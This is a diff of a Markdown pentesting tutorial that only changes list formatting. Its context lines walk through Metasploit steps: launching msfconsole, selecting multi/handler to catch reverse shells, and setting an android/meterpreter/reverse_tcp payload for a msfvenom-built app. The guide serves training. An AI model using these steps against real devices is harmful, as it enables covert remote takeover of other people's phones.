@@ -56,21 +56,21 @@ In this first practice we will use msfvenom to create an application which will 
 ┌──(root㉿CarlosSantos)-[/home/kali]
 └─# `msfconsole`
 
-1. *Running the msfconsole command will open an interactive console where you can use a wide range of Metasploit functionality. From this console, you can load and configure modules, select and configure exploits, scan and enumerate systems, launch attacks, and perform penetration testing on networks and systems.*
+* *Running the msfconsole command will open an interactive console where you can use a wide range of Metasploit functionality. From this console, you can load and configure modules, select and configure exploits, scan and enumerate systems, launch attacks, and perform penetration testing on networks and systems.*
 
 #### Running the /multi/handler
 msf6 >  `use /multi/handler`
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) >
 
-1. *This command is used to select the multi/handler module, which is a special module in Metasploit that is used to handle reverse shell or meterpreter connections. That is, it is the module that listens to and handles incoming connections from payloads that have been executed on the target systems.*
+* *This command is used to select the multi/handler module, which is a special module in Metasploit that is used to handle reverse shell or meterpreter connections. That is, it is the module that listens to and handles incoming connections from payloads that have been executed on the target systems.*
 
 
 #### set payload
 msf6 exploit(multi/handler) > `set payload android/meterpreter reverse_tcp`
 payload => android/meterpreter/reverse_tcp
 
-1. *The set payload android/meterpreter/reverse_tcp command is used in the msfconsole command line interface of the Metasploit Framework.*
+* *The set payload android/meterpreter/reverse_tcp command is used in the msfconsole command line interface of the Metasploit Framework.*
 
 * *This command configures the payload to be used in the currently selected module. In this case, the payload is android/meterpreter/reverse_tcp.*
 
